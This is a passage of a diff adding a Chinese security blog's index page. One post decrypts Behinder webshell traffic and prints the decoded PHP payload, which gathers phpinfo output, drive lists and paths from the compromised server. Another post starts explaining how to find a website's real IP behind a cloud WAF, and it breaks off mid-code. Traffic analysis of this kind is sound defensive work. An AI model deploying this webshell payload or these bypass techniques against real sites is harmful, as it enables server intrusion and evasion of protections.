class="line">dcdcrkZyDCYa0G5Vw7uTS6ZIOaSqPfpvWsmQsmHvaVxrsxuEFXOj+vBA3GeGyV/+bmU3FtU3Xsq59xArCVjIHmZNJFuO/56oL8SXkzz9jI5plqvO/kjt6mG3+qhLbw7dfyPfxNKjHLPG/hNHXCopv1l3GSPEE5HJP8sOkaZU78Yq/LDn6LpV/jb4b+mPsfo+moRsUqFTWf7So6IUPFrQguu/2uD43oKIWieqXyC5jJx1R/Fk58BmQrCRmeGvNJQ7Wqw4Iay3Uz33gPFFShPOyx7QDHl7CgU/nt3h0FldG1om9S/KaHjLHnUfZW4Knrw0V4p85OG8727E3xKxW8iJA9JE+vspnyGwxdAIjosf+qG5PfMzXWFw/p9wRW2mC7ELHc/fytyiKnlMcV74ftUoEdsPP3ar8FEB7co39IuB2LjG5ndzXEKTtJabEsNZ32m/bRq8Zu7WWzAZSyXgpgcZJFqwdMHFOdGzrtY+btAxVSOdYzEtqQHrJn5aLse+npTDYChNjpkvyU+eU5/WyI22AD6+w0lAwH67gF44PapmuDfBCbyDQQ+VlKCxRz7oiZ5yYmp0P9vNaLV0RcrwtrcbQcViVAnryZ0vr2LYumHsPbZqx4VUwcyrMTSiJg8S9owou1KTqyfz/zvF2hnSy2tB2C6zsnP9jIh9vPWNcGTSWHxh9rczHbS4lFVNMufb1IBkFaHkENS2iSbo2opIWYQxKlTwxa8L68zm3mPaRC1n72RfuFF2J5JjX2JK4w/obIFiOSVzdHUrIKWMXEtHqKF+yXcQANAV5p1edTUBMgqZUnmdYZn0fPZKuweWl42dWaMeE3aI90MsFdI0UBkYs1BR2zByCMNFUW5fZP5KjNKvC28ISmiR4hUVd1iza/TFVyYjK2wLGif7pHuK/anGlQzypXfIhLzT+0RpLmL9d68rzq8lUmuIWA5sLx9k1oFZBHtc59DHmcCNXqZtNa9ShIrOpwuQMRdlsUiUINDQslkPYQKO7pTTqiNgycThtnd8Z9AxCz//uJnJC7KVImEIjg2AMz9R4r8daSt9iYBshZOgy51H5PMgM6rw6ztuOgC6XRwB7Wpf63vvM7H8CoT0J9AZMvlZmItPPFwmE2v8Uxc6+mzN9GuR94II3F7KT17gORzVO3w0Z7K5zumpooESTa+MBg1MWbRXDuDIQRecYdDQs/y6OjkG2FVpYRmkFfftHFuq9G9EUMBzUvUz3OU2D5s79Jg8STYkdelNt34haLS83AsGm7pNZmaRBSeFtbcqcVqiZ8AhG9WIUh9kyJnBWZukQxuRzbGU2xhuXa4eYoYNpjJEwsWFLrBEf99ud+LQhfYza/s4/+81QMh+CR/pR+A36NiES+uD1D8tZ7CVgLpdQaUhk06TioI+ID9Ccc0HVWPx1eyfZQ6uykIXJaE9ySeO6CgiO/V8PxvhDzKBoB6dgZv+fe+HXRg+oQ21Lvq6LQMBQTJSu11V6MAqudMm9BqwFTr5O6pgCRi8IEhCQbjGn+lyDdOOY6yoow/BDA196m6G</span><br></pre></td></tr></table></figure>
+<p>AES解密后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;NE5XeDNWZmlMTmRpUE9EUFkwelBKZzQycEFtdXVleXBSMkx1T3hmcmVHUVh6M3pHbkVzYzZPWFpuZU1ubENaYlV1RU1nUUFVcFh1N1RVQWxDNG9YT3BkZ0dCNHZIa1c4TldJWThlaDdZRll3RjdWVnlYTEtKODVuU0JwUllnRTB0eDBmc2xDTURrNW13VFlWYlZOU0tuNUhqUDVmbUhVUnNBZ0xaT1BzNEdNTjZxcWswb3U0RWx4VW41TDZhSGFPdkhsZk1OYmRIMVJ0RW1GcUZrcndFak9TNmVTcEtLbVl3ZnBHc1U2Wm1XYUluUjEzdmxRenVXNHoxN2lrb1hzUkk5NFNHN1FUZXJYWmVjWjd3b3dtajlDZ2tYMzA3VUxYdFBla2ZJd3R4eFNQbXRzOWE3VVhkZTFzYXFtZ1pKNm5sQ3Y5dXlyTnNsZkdVSFkwQnk0VnhvdEVucHM1dFNibXN3TlBpckp3TWdONU40SDdERFozUEQ4dzh1ZG5HZHJhcVB0dGM5dUlUOVVhRGtPaWpSb3hnNUlSbjVmbmJVMmR4UWNNeG0xSHNpMVduRWxmZzRkb2ZzNDhTZ0RlUWpLemRZTmdrV0NIa3NCQ0p1d2dkZkVmaGFZRjliQXdsSkNzY1hJeWRRRnhmQUVUTVF5SlA5c3hEQ05zOGRscXhHb0JDTHBKbFE0WVJOblZsSVUxcW44WU9VQUx2V2dxUGdwVzM4cU42elZiaTRtNDZJNkw4Y2tiSFlTY1N0WGoweERCaHBpOTN1TllrTGhZTTJRM053YTEzUVd1RExKT2RUV2hZcjZlaWNaMlB0TTZCQ0xKaFdCV3JDWFJHbDdzd2h4Q3M2N2JxeXVPMWQzNHR4QnBXTU9OVXhoY0w0czhuTk9lNlNZRFNlYklVY3F3eHpNMVJhS1RkeFFGSTBRWTlGMnlHR0R3ejdjSXVSV1ZPZURPSW9wRTY0RmdmSzlHTFBVa3pzZzRpM1Bnb3JHUnJGUE9vUko1S3Nyc094Y25jWnFlNG5STTRzSlNPWTNxRGR3N1lGSmR0cmNmTVFUUkdjWUY3VUJ2QWZDRmhCOUNoT1dlc3ltZ0U5ODlONDNzQ0tRWHA=&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;status&quot;:&quot;success&quot;，&quot;msg&quot;:&quot;4NWx3VfiLNdiPODPY0zPJg42pAmuueypR2LuOxfreGQXz3zGnEsc6OXZneMnlCZbUuEMgQAUpXu7TUAlC4oXOpdgGB4vHkW8NWIY8eh7YFYwF7VVyXLKJ85nSBpRYgE0tx0fslCMDk5mwTYVbVNSKn5HjP5fmHURsAgLZOPs4GMN6qqk0ou4ElxUn5L6aHaOvHlfMNbdH1RtEmFqFkrwEjOS6eSpKKmYwfpGsU6ZmWaInR13vlQzuW4z17ikoXsRI94SG7QTerXZecZ7wowmj9CgkX307ULXtPekfIwtxxSPmts9a7UXde1saqmgZJ6nlCv9uyrNslfGUHY0By4VxotEnps5tSbmswNPirJwMgN5N4H7DDZ3PD8w8udnGdraqPttc9uIT9UaDkOijRoxg5IRn5fnbU2dxQcMxm1Hsi1WnElfg4dofs48SgDeQjKzdYNgkWCHksBCJuwgdfEfhaYF9bAwlJCscXIydQFxfAETMQyJP9sxDCNs8dlqxGoBCLpJlQ4YRNnVlIU1qn8YOUALvWgqPgpW38qN6zVbi4m46I6L8ckbHYScStXj0xDBhpi93uNYkLhYM2Q3Nwa13QWuDLJOdTWhYr6eicZ2PtM6BCLJhWBWrCXRGl7swhxCs67bqyuO1d34txBpWMONUxhcL4s8nNOe6SYDSebIUcqwxzM1RaKTdxQFI0QY9F2yGGDwz7cIuRWVOeDOIopE64FgfK9GLPUkzsg4i3PgorGRrFPOoRJ5KsrsOxcncZqe4nRM4sJSOY3qDdw7YFJdtrcfMQTRGcYF7UBvAfCFhB9ChOWesymgE989N43sCKQXp&quot;</span><br></pre></td></tr></table></figure></p>
+<h3><span id="2">2.</span></h3><p>请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /bingxie3.php HTTP/1.1</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Host: 192.168.150.129</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 3244</span><br><span class="line">Cookie: PHPSESSID=93vgns871ju4lvst0m1i5p3tj9</span><br><span class="line"></span><br><span class="line">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</span><br></pre></td></tr></table></figure>
+<p>AES解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigkd2hhdGV2ZXIpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIC8vZWNobyBvcGVuc3NsX2VuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICJBRVMxMjgiLCAka2V5KTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSR3aGF0ZXZlcj0iRFBWbU15R1FHVFRqNHhMY2luejBvbnhWZXp5TEx2MDFuUmdzNzB0R3hnV2FoTFRrSWhrc05hYTB4WEpkazFZVFVoM3BPRXVPZzVnakRIcTF5VW1IZWdEMG8wNldtN0VzUk9neVU0SFdWd2daWWZoN2xXcDRzMTk4NFpGUjB5NjVtSDl1aG1DUXF0bzRFMzI1RktxRnVkeHA0b3hISkhZNEp2NGN0TVpEd2RxR3FMUjNmdjh4NElCMzRpZmhVMWgxSmtXTTlrSHFXWUkyVUI5OVFZTHlpdWp1a0F2bXhKbEhndnVaTkJuT0pJSFAyZUJRdVEyOXptb2VhNGM4SmRWbU52R212M3JCc1NnRHA1Wm9qVzh0NVNnQzZsc2l5MlJvUUhVYktncGEzN2VQd1V0TjlRWlNvNEw5ZmZ0QmJHN256V2MxYUNTbGNoUVVzWUNjTXROVWttR0tZQTc3eUQwQWtlMDFFNzNKamNpNG85UW44YWxaZjUwQmo2NjZBcE5MWml5Mzd5dUlkRmtRS1dGZ1ZyU1pRSkoyaEx3N0dTVXFNVWZnU05yT3h3S0xTbGdNQnVXMFBiRlJUb2RtTHpad3lpVXp2a1NDdkRmcVh2Mkpna3VTZVN6TnRyN1JINk5ucEFWUWM1dWtBM09TUmhuTjlGVE4waEJra3JjS2VMZWZnTXNLU3dFRUU4S3JnUGhPOWt4RE5UR0dPZGRaYmEiOw0KbWFpbigkd2hhdGV2ZXIpOw==&apos;));</span><br></pre></td></tr></table></figure></p>
+<p>eval执行内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">($whatever)</span> </span>&#123;</span><br><span class="line">    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();</span><br><span class="line">    $driveList =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (stristr(PHP_OS,<span class="string">"windows"</span>)||stristr(PHP_OS,<span class="string">"winnt"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">65</span>;$i&lt;=<span class="number">90</span>;$i++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		$drive=chr($i).<span class="string">':/'</span>;</span><br><span class="line">    		file_exists($drive) ? $driveList=$driveList.$drive.<span class="string">";"</span>:<span class="string">''</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$driveList=<span class="string">"/"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    $currentPath=getcwd();</span><br><span class="line">    <span class="comment">//echo "phpinfo=".$info."\n"."currentPath=".$currentPath."\n"."driveList=".$driveList;</span></span><br><span class="line">    $osInfo=PHP_OS;</span><br><span class="line">    $result=<span class="keyword">array</span>(<span class="string">"basicInfo"</span>=&gt;base64_encode($info),<span class="string">"driveList"</span>=&gt;base64_encode($driveList),<span class="string">"currentPath"</span>=&gt;base64_encode($currentPath),<span class="string">"osInfo"</span>=&gt;base64_encode($osInfo));</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    session_start();</span><br><span class="line">    $key=$_SESSION[<span class="string">'k'</span>];</span><br><span class="line">    <span class="comment">//echo json_encode($result);</span></span><br><span class="line">    <span class="comment">//echo openssl_encrypt(json_encode($result), "AES128", $key);</span></span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode($result), $key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'openssl'</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> openssl_encrypt($data, <span class="string">"AES128"</span>, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$whatever=<span class="string">"DPVmMyGQGTTj4xLcinz0onxVezyLLv01nRgs70tGxgWahLTkIhksNaa0xXJdk1YTUh3pOEuOg5gjDHq1yUmHegD0o06Wm7EsROgyU4HWVwgZYfh7lWp4s1984ZFR0y65mH9uhmCQqto4E325FKqFudxp4oxHJHY4Jv4ctMZDwdqGqLR3fv8x4IB34ifhU1h1JkWM9kHqWYI2UB99QYLyiujukAvmxJlHgvuZNBnOJIHP2eBQuQ29zmoea4c8JdVmNvGmv3rBsSgDp5ZojW8t5SgC6lsiy2RoQHUbKgpa37ePwUtN9QZSo4L9fftBbG7nzWc1aCSlchQUsYCcMtNUkmGKYA77yD0Ake01E73Jjci4o9Qn8alZf50Bj666ApNLZiy37yuIdFkQKWFgVrSZQJJ2hLw7GSUqMUfgSNrOxwKLSlgMBuW0PbFRTodmLzZwyiUzvkSCvDfqXv2JgkuSeSzNtr7RH6NnpAVQc5ukA3OSRhnN9FTN0hBkkrcKeLefgMsKSwEEE8KrgPhO9kxDNTGGOddZba"</span>;</span><br><span class="line">main($whatever);</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/12/冰蝎流量解密分析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-new" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/04/new/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-云waf绕过" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/09/26/云waf绕过/">云waf绕过</a>
+    </h1>
+  
+
+        
+        <a href="/2020/09/26/云waf绕过/" class="archive-article-date">
+  	<time datetime="2020-09-26T13:05:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h2><span id="云waf简介">云waf简介</span></h2><p>WEB应用防火墙的云模式，这种模式让用户不需要在自己的网络中安装软件程序或部署硬件设备，就可以对网站实施安全防护，它的主要实现方式是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。</p>
+<h3><span id="优点">优点</span></h3><ol>
+<li><p>部署简单，只需把网站的dns修改一下就可以让网站进入云waf防护范围内，甚至，不需要专门的安全人员维护更。</p>
+</li>
+<li><p>同时有CDN作用，提高网站访问速度。</p>
+</li>
+</ol>
+<h3><span id="缺点">缺点</span></h3><ol>
+<li><p>不够可靠。云Waf处理一次请求，需要经过DNS解析、请求调度、流量过滤等环节，只要有一个环节出现问题，或者遭遇ddos被打垮了，会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，防护作用就没有了，而域名解析需要一定时间，又会导致网站短时间无法正常访问。</p>
+</li>
+<li><p>存在轻易被绕过的风险，因为是靠域名解析到云waf上，再由云waf过滤请求后发到真实ip来实现防御，<strong>一旦真实ip暴露，即被绕过</strong>。</p>
+</li>
+</ol>
+<h2><span id="怎么判断是否为云waf">怎么判断是否为云waf？</span></h2><h3><span id="1-ping">1. ping</span></h3><p><a href="http://ping.chinaz.com" target="_blank" rel="noopener">http://ping.chinaz.com</a><br>全国各地ping一下<br>独立ip的网站，各地ping出的ip相同<br>若各地ping的ip不同,则有CDN.若有显示CDN提供商,通过查询可知是否有云waf.</p>
+<h2><span id="绕过云waf寻找真实ip">绕过云waf寻找真实ip</span></h2><h3><span id="1用nslookup-域名-国外dns服务器-查询最近的dns记录">1.用nslookup [域名] [国外dns服务器] 查询最近的dns记录</span></h3><p>大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，可以使用国外dns查询域名，<br>不过要找冷门国外DNS才行，像谷歌的DNS 8.8.8.8 ，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，查到的结果和国内差不了多少。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 